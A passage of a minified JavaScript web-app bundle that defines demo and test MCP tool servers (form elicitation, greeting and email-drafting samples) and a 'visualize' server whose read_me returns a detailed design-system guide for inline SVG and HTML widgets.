try{let e="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof globalThis?globalThis:"undefined"!=typeof self?self:{},n=(new e.Error).stack;n&&(e._sentryDebugIds=e._sentryDebugIds||{},e._sentryDebugIds[n]="4636ce87-8862-4932-9ac8-40e2d7713190",e._sentryDebugIdIdentifier="sentry-dbid-4636ce87-8862-4932-9ac8-40e2d7713190")}catch(e){}{let e="undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof globalThis?globalThis:"undefined"!=typeof self?self:{};e._sentryModuleMetadata=e._sentryModuleMetadata||{},e._sentryModuleMetadata[new e.Error().stack]=Object.assign({},e._sentryModuleMetadata[new e.Error().stack],{"_sentryBundlerPluginAppKey:anthropic-apps":!0})}"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[72702],{0x11f424afe:(e,n,t)=>{t.r(n),t.d(n,{ConnectorsStore:()=>ey});var r=t(0xfc89b4a4),o=t(0x14c0dfde7),s=t(0x8cde4874),a=t(0x53f26187),i=t(0x156c4e43b),l=t(0x753d7f94);function c(){let e=new a._({name:"Elicitation Test",version:"1.0.0"},{jsonSchemaValidator:l.hm});return e.tool("elicit_confirmation","Elicitation confirmation tool",{style:i.k5(["bool","enum","no-field"])},async n=>{let{style:t}=n,r=await e.server.elicitInput({message:"Do you confirm you want to proceed?",requestedSchema:{type:"object",properties:"no-field"===t?{}:{confirm:"enum"===t?{title:"Confirm",type:"string",enum:["yes","no"],enumNames:["Yes, I confirm","No, cancel"]}:{title:"Confirm",type:"boolean",description:"Please confirm your action"}},required:["confirm"]}});return{content:[{type:"text",text:"Elicitation result: ".concat(JSON.stringify(r,null,2))}]}}),e.tool("elicit_inputs","Elicitation test tool",{},async(n,t)=>{let r=await e.server.elicitInput({message:"Please provide inputs for the following fields:",requestedSchema:{type:"object",properties:{name:{title:"Full Name",type:"string",description:"Your full, legal name"},check:{title:"Agree to terms",type:"boolean",description:"A boolean check"},color:{title:"Favorite Color",type:"string",description:"Favorite color (open text)",default:"blue"},email:{title:"Email Address",type:"string",format:"email",description:"Your email address (will be verified, and never shared with anyone else)"},homepage:{type:"string",format:"uri",description:"Homepage / personal site"},birthdate:{title:"Birthdate",type:"string",format:"date",description:"Your date of birth (will never be shared with anyone else)"},integer:{title:"Favorite Integer",type:"integer",description:"Your favorite integer (do not give us your phone number, pin, or other sensitive info)",minimum:1,maximum:100,default:42},number:{title:"Favorite Number",type:"number",description:"Favorite number (there are no wrong answers)",minimum:0,maximum:1e3,default:3.14},petType:{title:"Pet type",type:"string",enum:["cats","dogs","birds","fish","reptiles"],enumNames:["Cats","Dogs","Birds","Fish","Reptiles"],default:"dogs",description:"Your favorite pet type"}},required:["name"]}},{relatedRequestId:t.requestId,timeout:1e8});return{content:[{type:"text",text:"Elicitation result: ".concat(JSON.stringify(r,null,2))}]}}),e.tool("write_poem","Poem writing tool",{},async()=>{let n=await e.server.elicitInput({message:"Please provide inputs for the following fields:",requestedSchema:{type:"object",properties:{subject:{type:"string",title:"Subject",description:"Subject of the poem",enum:["Nature","Love","Adventure","Friendship","Mystery","Fantasy","Humor","Inspiration","Life","Death"]}},required:["subject"]}});if("accept"!==n.action||!(null==n?void 0:n.data))throw Error("Elicitation was not accepted or no data provided");let{subject:t}=n.data;return{content:[{type:"text",text:"TODO: write a poem about ".concat(t)}]}}),e}var d=t(0x18a09144);function p(){let e=new a._({name:"Demo",version:"1.0.0"},{jsonSchemaValidator:l.hm});return e.tool("add",{a:i.ai(),b:i.ai()},e=>{let{a:n,b:t}=e;return{content:[{type:"text",text:String(n+t)}]}}),e.tool("greet_person",{name:i.Yj(),greeting:i.Yj()},e=>{let{name:n,greeting:t}=e;return{content:[{type:"text",text:"Message sent to ".concat(n,": ").concat(t," ").concat(n,"!")}]}}),e.registerTool("draft_email",{description:"Draft an email. IMPORTANT: Only include recipient email if the user has explicitly provided it. Never make up or guess email addresses.",inputSchema:{recipientName:i.Yj().optional().describe("Recipient name - only include if explicitly provided by user"),recipientEmail:i.Yj().email().optional().describe("Recipient email address - only include if explicitly provided by user, never fabricate"),subject:i.Yj().describe("Email subject")}},async(n,t)=>{let r,{recipientName:o,recipientEmail:s,subject:a}=n;if((0,d.P)()){let n=await e.server.createMessage({maxTokens:1e3,messages:[{role:"user",content:{type:"text",text:a}}],systemPrompt:"You are an email drafting assistant. Write a professional email based on the subject given by the user."},{relatedRequestId:t.requestId});if("text"!==n.content.type)throw Error("Unexpected content type from sampling");r=n.content.text}else r="Ad Consectetur Et\n\nLorem Ipsum enim lorem quis ad dolor sed incididunt veniam sit et incididunt. Et dolor ad amet sed dolor minim ipsum dolor aliqua et. Adipiscing ad dolore eiusmod lorem minim ipsum sed dolore elit consectetur. Et sit labore lorem incididunt labore nostrud enim enim. Dolore ipsum ipsum dolor elit do consectetur labore quis elit ipsum ad. Ad quis labore eiusmod sit ipsum elit minim labore sit consectetur eiusmod ut quis sit. Elit minim adipiscing do magna consectetur minim sed aliqua nostrud minim magna quis incididunt. Do enim magna et dolor ut amet ut.\n\nAmet elit sed dolore magna ut sed do aliqua ipsum nostrud et aliqua veniam. Sed incididunt tempor quis ad magna do do. Consectetur incididunt et incididunt dolore labore labore ad enim lorem ipsum et. Magna dolore do ipsum elit do lorem et lorem minim et ad sed. Adipiscing labore sed quis incididunt dolor dolor quis sit sed ipsum amet minim. Sed ad ut incididunt minim adipiscing dolor eiusmod ad nostrud. Amet ut sit et magna veniam dolor enim elit sed ipsum aliqua. Incididunt ipsum veniam veniam amet amet quis sit ut.\n\nEnim incididunt eiusmod dolor magna incididunt dolor quis quis minim incididunt incididunt. Incididunt minim et elit ipsum labore consectetur amet tempor enim. Ad magna sit aliqua sit adipiscing do ut. Sit aliqua nostrud et elit do veniam incididunt dolore ad magna enim lorem ipsum. Sed magna eiusmod magna nostrud consectetur dolor quis dolore ut. Consectetur lorem sed sit adipiscing magna ad consectetur do sit ad elit sed lorem. Adipiscing veniam quis nostrud aliqua eiusmod magna do labore et enim eiusmod dolor. Minim minim ipsum lorem quis eiusmod do do magna minim quis ut.";let i=await e.server.elicitInput({message:"Please validate this email draft",requestedSchema:{type:"object",properties:{recipientName:{type:"string",description:"Recipient name",default:o},recipientEmail:{type:"string",format:"email",description:"Recipient email",default:s},subject:{type:"string",description:"Subject",default:a},body:{type:"string",description:"Body",default:r}},required:["subject","body","recipientEmail"]}},{relatedRequestId:t.requestId});if("accept"!==i.action)return{content:[{type:"text",text:"Email drafting cancelled by user."}],isError:!0};let l={confirmation:"Email sent! (just kidding)",...i.content};return{content:[{type:"text",text:JSON.stringify(l,null,2)}],structuredContent:l}}),e.resource("Available greetings","greeting://all_greetings",e=>({contents:[{uri:e.href,text:"Hello!"},{uri:e.href,text:"Hi!"},{uri:e.href,text:"Hey!"}]})),e.registerTool("structuredContent",{description:"Returns some structured content",inputSchema:{backwardsCompatible:i.zM().describe("Whether to include the structured content in the content blocks as well (as per MCP spec recommendation, for backwards compatibility)")},outputSchema:{message:i.Yj()}},e=>{let{backwardsCompatible:n}=e,t={message:"Your name is now Claudette."};return{content:n?[{type:"text",text:JSON.stringify(t)}]:[],structuredContent:t}}),e.registerPrompt("ask_to_greet",{description:"Generate a prompt to ask the assistant to greet someone",argsSchema:{name:i.Yj().describe("Name of the person to greet")}},e=>{let{name:n}=e;return{messages:[{role:"user",content:{type:"text",text:"Please greet: ".concat(n)}}]}}),e}var u=t(0x1d7b688e4),m=t(0x10e01d04d);let h="ui://imagine/show-widget.html";var g=function(e){return e.SHOW_WIDGET="show_widget",e.READ_ME="read_me",e}(g||{});let f=[{name:"show_widget",description:"Show visual content — SVG graphics, diagrams, charts, or interactive HTML widgets — that renders inline alongside your text response.\nUse for flowcharts, architecture diagrams, dashboards, forms, calculators, data tables, games, illustrations, or any visual content.\nThe code is auto-detected: starts with <svg = SVG mode, otherwise HTML mode.\nA global sendPrompt(text) function is available — it sends a message to chat as if the user typed it.\nIMPORTANT: Call read_me first — it gives you the full design system (CSS variables, colors, typography, examples). This allows to set 'i_have_seen_read_me: true' first argument.",inputSchema:{type:"object",properties:{i_have_seen_read_me:{type:"boolean",description:"Confirm whether you have already called read_me in this conversation and have the design system in response."},code:{type:"string",description:'SVG or HTML code to render. For SVG: raw SVG code starting with <svg> tag, must use CSS variables for colors. Example: <svg viewBox="0 0 700 400" xmlns="http://www.w3.org/2000/svg">...</svg>. For HTML: raw HTML content to render, do NOT include DOCTYPE, <html>, <head>, or <body> tags. Use CSS variables for theming. Keep background transparent and avoid top-level padding. Scripts are supported but execute after streaming completes.'}},required:["i_have_seen_read_me","code"]},annotations:{readOnlyHint:!0},_meta:{ui:{resourceUri:h}}},{name:"read_me",description:"Returns the visualize design system reference. Call this BEFORE calling show_widget to get the full guide (CSS variables, colors, typography, layout rules, examples).",inputSchema:{type:"object",properties:{modules:{type:"array",items:{type:"string",enum:["chart"]},description:"Optional modules to include. Available: 'chart' (Chart.js usage guide for HTML charts)."}}},annotations:{readOnlyHint:!0}}],y=[{uri:h,name:"visualize widget",description:"Renders SVG or HTML content progressively as it streams for the show_widget tool",mimeType:"text/html;profile=mcp-app"}];function b(){var e={jsonSchemaValidator:l.hm};let n=new u.g({name:"visualize",version:"1.0.0"},{...e,capabilities:{tools:{},resources:{}}});return n.setRequestHandler(m.gW,()=>({tools:f})),n.setRequestHandler(m.FT,e=>{let{name:n,arguments:t}=e.params;return function(e,n){if("show_widget"===e)return{content:[{type:"text",text:"Content rendered and shown to the user. Please do not duplicate the shown content in text because it's already visually represented."}]};if("read_me"===e){var t;let e=null!=(t=n.modules)?t:[],r='# Imagine — Visual Creation Suite\n\nYou create rich visual content — SVG diagrams/illustrations and HTML interactive widgets — that renders inline in conversation. The best output feels like a natural extension of the chat.\n\n## Core Design System\n\nThese rules apply to ALL use cases.\n\n### Philosophy\n- **Seamless**: Users shouldn\'t notice where claude.ai ends and your widget begins.\n- **Flat**: No gradients, mesh backgrounds, noise textures, or decorative effects. Clean flat surfaces.\n- **Compact**: Show the essential inline. Explain the rest in text.\n\n### Streaming\nOutput streams token-by-token. Structure code so useful content appears early.\n- **HTML**: `<style>` (short) → content HTML → `<script>` last.\n- **SVG**: `<defs>` (markers) → visual elements immediately.\n- Prefer inline `style="..."` over `<style>` blocks — inputs/controls must look correct mid-stream.\n- Keep `<style>` under ~15 lines. Interactive widgets with inputs and sliders need more style rules — that\'s fine, but don\'t bloat with decorative CSS.\n- Gradients, shadows, and blur flash during streaming DOM diffs. Use solid flat fills instead.\n\n### Rules\n- No `\x3c!-- comments --\x3e` or `/* comments */` (waste tokens, break streaming)\n- No font-size below 11px\n- No emoji — use CSS shapes or SVG paths\n- No gradients, drop shadows, blur, glow, or neon effects\n- **No box-shadows** — the container clips them. Use borders for visual separation instead. Exception: `box-shadow: 0 0 0 Npx` focus rings on inputs are allowed — they are functional UI, not decorative.\n- No dark/colored backgrounds on outer containers (transparent only — host provides the bg)\n- **Typography**: Prose text (headings, paragraphs, blockquotes, tables, subheadings) uses the default body font (Anthropic Serif). UI controls (input labels, buttons, inputs, badges, metric values, chart legends) use `font-family: var(--font-sans)`.\n- **Headings**: h1 = 22px, h2 = 18px, h3 = 16px — all `font-weight: 600`. Body text = 16px, weight 400, `line-height: 1.7`.\n- **Sentence case** always. Never Title Case, never ALL CAPS. This applies everywhere including SVG text labels and diagram headings.\n- **No mid-sentence bolding** — don\'t use `<strong>` within prose. Bold is for headings and labels only.\n- **Surface card** — the default. For inline content that\'s part of the page flow: metrics, stats, chart containers, diagram backgrounds, summary blocks. Recedes into the page. `background: var(--color-background-secondary); border-radius: var(--border-radius-xl); corner-shape: squircle; padding: 1rem;` No border, no shadow.\n- **Raised card** — for distinct, self-contained objects the user would think of as "a thing": contact records, receipts, pricing plans, product cards, comparison items, data records. Feels like a piece of paper sitting on the surface. `background: var(--color-background-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: var(--border-radius-xl); corner-shape: squircle; padding: 1rem;`\n- HTML widgets: add `padding: 1rem 0` on outermost wrapper for breathing room.\n- No DOCTYPE, `<html>`, `<head>`, or `<body>` — just content fragments.\n- **Don\'t use imagine for tables** — output tables as markdown in your normal response. Only use imagine for tables when they need interactive elements or are part of a larger visual (e.g. a dashboard with charts + tables together).\n- When placing text on a colored background (badges, pills, cards, tags), use the darkest shade from that same color family for the text — never plain black or generic gray.\n- **Buttons**: Always outline style — transparent background, `border: 0.5px solid var(--color-border-secondary)`. No colored or filled backgrounds. On hover, use `background: var(--color-background-secondary)`. On active: `background: var(--color-border-tertiary); transform: scale(0.98)`. Add `transition: background 0.15s, transform 0.1s` to the base style.\n- **Corners**: Always pair `border-radius` with `corner-shape: squircle` for smoother, iOS-style rounded corners — except on inputs/textareas where the radius is small (6px) and the effect is negligible.\n- **No rounded corners on single-sided borders** — if using `border-left` or `border-top` accents, set `border-radius: 0`. Rounded corners only work with full borders on all sides.\n- **No titles inside the tool output for diagrams and charts** — editorial/interactive layouts may include section headings, but for diagrams and charts, describe and introduce the visual in your response text before the tool call. The tool output should show the content directly without a heading or title at the top.\n- **Icon sizing**: When using emoji or inline SVG icons, explicitly set `font-size: 16px` for emoji or `width: 16px; height: 16px` for SVG icons. Never let icons inherit the container\'s font size — they will render too large. For larger decorative icons, use 24px max.\n- No tabs, carousels, or `display: none` sections — hidden content streams invisibly. Show all content stacked vertically.\n- No nested scrolling — auto-fit height.\n- Scripts execute after streaming — import from esm.sh CDN.\n\n### CSS Variables\n**Backgrounds**: `--color-background-primary` (white), `-secondary` (surfaces), `-tertiary` (page bg), `-info`, `-danger`, `-success`, `-warning`\n**Text**: `--color-text-primary` (black), `-secondary` (muted), `-tertiary` (hints), `-info`, `-danger`, `-success`, `-warning`\n**Borders**: `--color-border-tertiary` (0.15α, default), `-secondary` (0.3α, hover), `-primary` (0.4α), semantic `-info/-danger/-success/-warning`\n**Typography**: `--font-sans`, `--font-mono`\n**Layout**: `--border-radius-md` (8px), `--border-radius-lg` (12px — preferred for most components), `--border-radius-xl` (16px)\nAll use `light-dark()` and auto-adapt. For custom colors, use `light-dark(#lightHex, #darkHex)`.\n\n### Component Patterns\n\n**Input** (inline styles for streaming safety, `<style>` only for hover/focus):\n```html\n<style>\n  input[type="text"]:hover, input[type="number"]:hover, select:hover, textarea:hover { border-color: var(--color-border-secondary) !important; }\n  input[type="text"]:focus, input[type="number"]:focus, select:focus, textarea:focus { border-color: var(--color-border-info) !important; outline: none; box-shadow: 0 0 0 3px var(--color-background-info); }\n</style>\n<input type="number" value="100" style="width: 100%; height: 36px; padding: 8px 12px; font-size: 16px; font-family: var(--font-sans); background: var(--color-background-primary); color: var(--color-text-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: 6px; outline: none; transition: border-color 0.15s, box-shadow 0.15s;" />\n```\n\n**Select** (same base styles as input):\n```html\n<select style="width: 100%; height: 36px; padding: 8px 12px; font-size: 16px; font-family: var(--font-sans); background: var(--color-background-primary); color: var(--color-text-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: 6px; outline: none; transition: border-color 0.15s, box-shadow 0.15s; cursor: pointer;">\n  <option>Option A</option>\n  <option>Option B</option>\n</select>\n```\n\n**Textarea** (same base styles, taller):\n```html\n<textarea style="width: 100%; min-height: 80px; padding: 8px 12px; font-size: 16px; font-family: var(--font-sans); background: var(--color-background-primary); color: var(--color-text-primary); border: 0.5px solid var(--color-border-tertiary); border-radius: 6px; outline: none; transition: border-color 0.15s, box-shadow 0.15s; resize: vertical; line-height: 1.5;" placeholder="Enter text..."></textarea>\n```\n\n**Range slider** (always pair with label + visible value):\n```html\n<style>\n  input[type="range"] { -webkit-appearance: none; appearance: none; height: 4px; background: light-dark(rgba(0,0,0,0.08), rgba(255,255,255,0.1)); border-radius: 2px; outline: none; }\n  input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; border-radius: 50%; background: var(--color-background-primary); border: 1px solid var(--color-border-secondary); cursor: pointer; transition: border-color 0.15s, transform 0.15s; }\n  input[type="range"]:hover::-webkit-slider-thumb { border-color: var(--color-border-primary); transform: scale(1.1); }\n  input[type="range"]::-moz-range-thumb { width: 18px; height: 18px; border-radius: 50%; background: var(--color-background-primary); border: 1px solid var(--color-border-secondary); cursor: pointer; }\n</style>\n<div style="display: flex; align-items: center; gap: 12px;">\n  <label style="font-family: var(--font-sans); font-size: 14px; color: var(--color-text-secondary);">Years</label>\n  <input type="range" min="1" max="40" value="20" style="flex: 1;" />\n  <span style="font-family: var(--font-sans); font-size: 14px; font-weight: 600; color: var(--color-text-primary); min-width: 24px;">20</span>\n</div>\n```\nWhen displaying slider values, always round to avoid floating point artifacts (e.g. use `Math.round(val)` or `val.toFixed(1)`, never show raw float like `7.000000000000001%`). Use integer steps on range inputs where possible (`step="1"`).\n\n**Blockquote**: `<blockquote style="border-left: 4px solid var(--color-border-tertiary); padding-left: 1rem; margin: 2rem 0; font-size: 16px; font-style: italic; color: var(--color-text-tertiary);">`\n\n**Badge**: `<span style="font-size: 12px; font-family: var(--font-sans); font-weight: 500; padding: 4px 12px; border-radius: var(--border-radius-md); corner-shape: squircle; background: var(--color-background-success); color: var(--color-text-success); border: 0.5px solid var(--color-border-success);">Active</span>`\n\n**Metric card** (surface style, for KPIs and stats — use in grids of 2-4):\n```html\n<div style="background: var(--color-background-secondary); border-radius: var(--border-radius-lg); corner-shape: squircle; padding: 1rem;">\n  <p style="font-family: var(--font-sans); color: var(--color-text-secondary); margin: 0 0 .25rem; font-size: 13px; font-weight: 500;">Total revenue</p>\n  <p style="font-family: var(--font-sans); color: var(--color-text-primary); margin: 0; font-size: 24px; font-weight: 600;">$54,200</p>\n</div>\n```\n\n**Avatar / initials** (colored circle with 1-2 letter initials):\n```html\n<div style="width: 44px; height: 44px; border-radius: 50%; background: var(--color-background-info); display: flex; align-items: center; justify-content: center; font-family: var(--font-sans); font-weight: 600; font-size: 14px; color: var(--color-text-info);">MR</div>\n```\nSwap `-info` for `-success`, `-warning`, `-danger` to vary color. Use 36px for compact layouts, 44px default, 56px for profile headers.\n\n**Table** (conditional — only use inside larger visuals like dashboards, never standalone; prefer markdown tables):\n```html\n<table style="width: 100%; border-collapse: collapse; font-size: 14px; line-height: 1.7;">\n  <thead><tr>\n    <th style="text-align: left; padding: 8px 16px 8px 0; font-weight: 700; border-bottom: 0.5px solid var(--color-border-secondary);">Header</th>\n  </tr></thead>\n  <tbody><tr>\n    <td style="padding: 8px 16px 8px 0; border-bottom: 0.5px solid var(--color-border-tertiary);">Cell</td>\n  </tr></tbody>\n</table>\n```\n\n**Chart legend** (hide Chart.js default, build custom):\n```html\n<div style="display: flex; gap: 16px; margin-top: 8px; font-family: var(--font-sans); font-size: 12px; color: var(--color-text-secondary);">\n  <span style="display: flex; align-items: center; gap: 4px;"><span style="width: 10px; height: 10px; border-radius: 2px; background: #3266ad;"></span>Series A</span>\n  <span style="display: flex; align-items: center; gap: 4px;"><span style="width: 10px; height: 10px; border-radius: 2px; background: #73726c;"></span>Series B</span>\n</div>\n```\n\n**Button**: outline style, no background color. `border: 0.5px solid var(--color-border-secondary); background: transparent; color: var(--color-text-primary); padding: 8px 16px; border-radius: var(--border-radius-lg); corner-shape: squircle; cursor: pointer; font-family: var(--font-sans); font-size: 14px; transition: background 0.15s, transform 0.1s;` On hover: `background: var(--color-background-secondary)`. On active: `background: var(--color-border-tertiary); transform: scale(0.98)`.\n\n### sendPrompt(text)\nA global function that sends a message to chat as if the user typed it. Use it when the user\'s next step benefits from Claude thinking. Handle filtering, sorting, toggling, and calculations in JS instead.\n\n---\n\n## Use Cases\n\nIdentify which use case fits, then follow its specific guidance.\n\n### 1. Explain a concept — diagram\n*"Explain how compound interest works" / "How does a Kubernetes pod work"*\n\nUse `imagine_svg` for diagrams. The widget automatically wraps SVG output in a card.\n\n**Pick the right diagram type.** Ask: does *where* things happen matter to the explanation?\n- **No** → **Flowchart**. Boxes represent concepts, arrows show relationships. Good for: algorithms, decision trees, approval workflows, data pipelines, cause-and-effect chains.\n- **Yes** → **Structural diagram**. Containers represent physical or logical locations, nesting shows containment. Good for: biology (cells, organelles), architecture (buildings, rooms), systems (clusters, nodes, pods), network topology (VPC, subnet, instance).\n- **Not sure?** Default to flowchart — it\'s simpler and has fewer failure modes.\n\nDon\'t mix the two in one diagram. A flowchart with nested containers, or a structural diagram with long arrow chains, gets confusing. Pick one approach per diagram.\n\n**For complex topics, use multiple SVG calls** — break the explanation into a series of smaller diagrams rather than one dense diagram. Each SVG streams in with its own animation and card, creating a visual narrative the user can follow step by step.\n\n**Always add prose between diagrams** — never stack multiple SVG calls back-to-back without text. Between each SVG, write a short paragraph (in your normal response text, outside the tool call) that explains what the next diagram shows and connects it to the previous one.\n\n**SVG dimensions:** Use `viewBox="0 0 680 N"` where N is the height needed. This matches the container width (~680px on claude.ai). Never exceed 680px wide. Set `width="100%"` on the `<svg>` element — do not use fixed pixel widths. Make sure the viewBox height covers all content with at least 20px padding at the bottom — if your lowest element is at y=400, set the viewBox height to at least 420. Content outside the viewBox is clipped and invisible.\n\n**SVG setup**: `<svg width="100%" viewBox="0 0 680 H">` — 680px wide, flexible height. Set H to fit content tightly — the last element\'s bottom edge + 20px padding. Don\'t leave excess empty space below the content. Safe area: x=20 to x=660, y=20 to y=(H-20). Background transparent. **Do not wrap the SVG in a container `<div>` with a background color** — the widget host already provides the card container and background. Output the raw `<svg>` element directly.\n\n**Style rules for all diagrams**:\n- Use only two font sizes: 14px for node/region labels (class="t" or "th"), 12px for subtitles, descriptions, and arrow labels (class="ts"). No other sizes.\n- No decorative step numbers, large numbering, or oversized headings outside boxes.\n- No icons or illustrations inside boxes — text only.\n- Sentence case on all labels.\n\n**Pre-built classes** (already loaded in SVG widget):\n- `class="t"` = sans 14px primary, `class="ts"` = sans 12px secondary, `class="th"` = sans 14px semibold\n- `class="box"` = neutral rect (bg-secondary fill, border stroke)\n- `class="node"` = clickable group with hover effect (cursor pointer, slight dim on hover)\n- `class="arr"` = arrow line (1.5px, open chevron head)\n- Short aliases: `var(--p)`, `var(--s)`, `var(--t)`, `var(--bg2)`, `var(--b)`\n- Arrow marker: always include this `<defs>` at the start of every SVG (this is the only allowed use of `<defs>`):\n  `<defs><marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M2 1L8 5L2 9" fill="none" stroke="var(--t)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></marker></defs>`\n  Then use `marker-end="url(#arrow)"` on lines. Do not add any other `<defs>` content — no filters, no clip-paths, no other markers.\n\n#### Flowchart\n\nFor sequential processes, cause-and-effect, decision trees.\n\n**Planning**: Size boxes to fit their text generously. At 14px sans-serif, each character is ~8px wide — a label like "Load Balancer" (13 chars) needs a rect at least 140px wide. When in doubt, make boxes wider and leave more space between them. Cramped diagrams are the most common failure mode.\n\n**Spacing**: 60px minimum between boxes, 24px padding inside boxes, 12px between text and edges. Leave 10px gap between arrowheads and box edges. Two-line boxes (title + subtitle) need at least 56px height with 22px between the lines.\n\n**Layout**: Prefer single-direction flows (all top-down or all left-right). Keep diagrams simple — max 4-5 nodes per diagram. The widget is narrow (~680px) so complex layouts break. Split complex concepts into multiple smaller diagrams with prose between them rather than cramming everything into one.\n\nKeep all nodes the same height when they have the same content type (e.g. all single-line boxes = 44px, all two-line boxes = 56px).\n\n**Arrow labels**: Most connectors don\'t need labels — if the flow is obvious (sequential steps, cause→effect), let the arrow speak for itself. Only label when the relationship is ambiguous or there are multiple outgoing arrows from one node. When you do label, place small text near the midpoint of the line:\n```svg\n<text class="ts" x="220" y="99" text-anchor="middle">Activates</text>\n```\nNo pill badges or background rects on arrow labels — just plain text.\nFor fan-out with identical labels, label only one branch.\n\n**Flowchart components** — use these patterns consistently:\n\n*Single-line node* (44px tall): title only.\n```svg\n<g class="node" onclick="sendPrompt(\'Tell me more about T-cells\')">\n  <rect x="100" y="20" width="180" height="44" rx="8" fill="light-dark(#E6F1FB, #0C447C)" stroke="light-dark(#185FA5, #85B7EB)" stroke-width="0.5"/>\n  <text class="th" x="190" y="42" text-anchor="middle" fill="light-dark(#185FA5, #B5D4F4)">T-cells</text>\n</g>\n```\n\n*Two-line node* (56px tall): bold title + muted subtitle.\n```svg\n<g class="node" onclick="sendPrompt(\'Tell me more about dendritic cells\')">\n  <rect x="100" y="20" width="200" height="56" rx="8" fill="light-dark(#E6F1FB, #0C447C)" stroke="light-dark(#185FA5, #85B7EB)" stroke-width="0.5"/>\n  <text class="th" x="200" y="40" text-anchor="middle" fill="light-dark(#185FA5, #B5D4F4)">Dendritic cells</text>\n  <text class="ts" x="200" y="58" text-anchor="middle" fill="light-dark(#185FA5, #B5D4F4)">Detect foreign antigens</text>\n</g>\n```\n\n*Connector with label*:\n```svg\n<line x1="200" y1="76" x2="200" y2="120" class="arr" marker-end="url(#arrow)"/>\n<text class="ts" x="210" y="100">Activates</text>\n```\n\n*Neutral node* (gray, for start/end/generic steps): use `class="box"` for auto-themed fill/stroke, and default text classes.\n\nMake all nodes clickable by default — wrap in `<g class="node" onclick="sendPrompt(\'...\')">`. The hover effect is built in.\n\n#### Structural diagram\n\nFor concepts where physical or logical containment matters — things inside other things.\n\n**When to use**: The explanation depends on *where* processes happen. Examples: how a cell works (organelles inside a cell), how Kubernetes works (containers inside pods inside nodes), how a building\'s HVAC works (ducts inside floors inside a building), how a CPU cache hierarchy works (L1 inside core, L2 shared).\n\n**Core idea**: Large rounded rects are containers. Smaller rects inside them are regions or sub-structures. Text labels describe what happens in each region. Arrows show flow between regions or from external inputs/outputs.\n\n**Container rules**:\n- Outermost container: large rounded rect, rx=20-24, lightest fill (50 stop), 0.5px stroke (600 stop). Label at top-left inside, 14px bold.\n- Inner regions: medium rounded rects, rx=8-12, next shade fill (100-200 stop). Use a different color ramp if the region is semantically different from its parent.\n- 20px minimum padding inside every container — text and inner regions must not touch the container edges.\n- Max 2-3 nesting levels. Deeper nesting gets unreadable at 680px width.\n\n**Layout**:\n- Place inner regions side by side within the container, with 16px+ gap between them.\n- External inputs (sunlight, water, data, requests) sit outside the container with arrows pointing in.\n- External outputs sit outside with arrows pointing out.\n- Keep external labels short — one word or a short phrase. Details go in the prose between diagrams.\n\n**What goes inside regions**: Text only — the region name (14px bold) and a short description of what happens there (12px). Don\'t put flowchart-style boxes inside regions. Don\'t draw illustrations or icons inside.\n\n**Structural container example** (chloroplast with two regions):\n```svg\n<rect x="100" y="40" width="480" height="240" rx="24" fill="light-dark(#EAF3DE, #27500A)" stroke="light-dark(#3B6D11, #97C459)" stroke-width="0.5"/>\n<text class="th" x="120" y="68" fill="light-dark(#27500A, #C0DD97)">Chloroplast</text>\n<text class="ts" x="120" y="88" fill="light-dark(#27500A, #C0DD97)">Stroma (fluid)</text>\n\n<rect x="130" y="110" width="200" height="150" rx="12" fill="light-dark(#C0DD97, #3B6D11)" stroke="light-dark(#3B6D11, #97C459)" stroke-width="0.5"/>\n<text class="th" x="230" y="136" text-anchor="middle" fill="light-dark(#173404, #EAF3DE)">Thylakoid membrane</text>\n<text class="ts" x="230" y="228" text-anchor="middle" fill="light-dark(#173404, #EAF3DE)">Light reactions</text>\n\n<rect x="370" y="110" width="190" height="150" rx="12" fill="light-dark(#FAEEDA, #633806)" stroke="light-dark(#854F0B, #FAC775)" stroke-width="0.5"/>\n<text class="th" x="465" y="136" text-anchor="middle" fill="light-dark(#633806, #FAEEDA)">Calvin cycle</text>\n<text class="ts" x="465" y="158" text-anchor="middle" fill="light-dark(#633806, #FAEEDA)">(in stroma)</text>\n\n<line x1="330" y1="185" x2="370" y2="185" stroke="var(--t)" stroke-width="1.5" marker-end="url(#arrow)"/>\n<text class="ts" x="350" y="178" text-anchor="middle">ATP</text>\n\n<text class="th" x="40" y="145" text-anchor="middle" fill="light-dark(#633806, #FAC775)">Sunlight</text>\n<line x1="66" y1="148" x2="126" y2="170" stroke="var(--t)" stroke-width="1.5" marker-end="url(#arrow)"/>\n```\n\n**Color in structural diagrams**: Use one color ramp for the container and its primary sub-structures (e.g. Green for the chloroplast and thylakoids). Use a contrasting ramp for a region that does something functionally different (e.g. Amber for the Calvin cycle). This makes the diagram scannable — you can see at a glance which parts are related.\n\n---\n\n**Diagram color palette** — 9 color ramps, each with 7 stops from lightest to darkest. 50 = lightest fill, 100-200 = light fills, 400 = mid tones, 600 = strong/border, 800-900 = text on light fills.\n\n| Ramp | 50 (lightest) | 100 | 200 | 400 | 600 | 800 | 900 (darkest) |\n|------|------|-----|-----|-----|-----|-----|------|\n| Purple | #EEEDFE | #CECBF6 | #AFA9EC | #7F77DD | #534AB7 | #3C3489 | #26215C |\n| Teal | #E1F5EE | #9FE1CB | #5DCAA5 | #1D9E75 | #0F6E56 | #085041 | #04342C |\n| Coral | #FAECE7 | #F5C4B3 | #F0997B | #D85A30 | #993C1D | #712B13 | #4A1B0C |\n| Pink | #FBEAF0 | #F4C0D1 | #ED93B1 | #D4537E | #993556 | #72243E | #4B1528 |\n| Gray | #F1EFE8 | #D3D1C7 | #B4B2A9 | #888780 | #5F5E5A | #444441 | #2C2C2A |\n| Blue | #E6F1FB | #B5D4F4 | #85B7EB | #378ADD | #185FA5 | #0C447C | #042C53 |\n| Green | #EAF3DE | #C0DD97 | #97C459 | #639922 | #3B6D11 | #27500A | #173404 |\n| Amber | #FAEEDA | #FAC775 | #EF9F27 | #BA7517 | #854F0B | #633806 | #412402 |\n| Red | #FCEBEB | #F7C1C1 | #F09595 | #E24B4A | #A32D2D | #791F1F | #501313 |\n\n**How to assign colors**: Color should encode meaning, not sequence. Don\'t cycle through colors like a rainbow (step 1 = blue, step 2 = 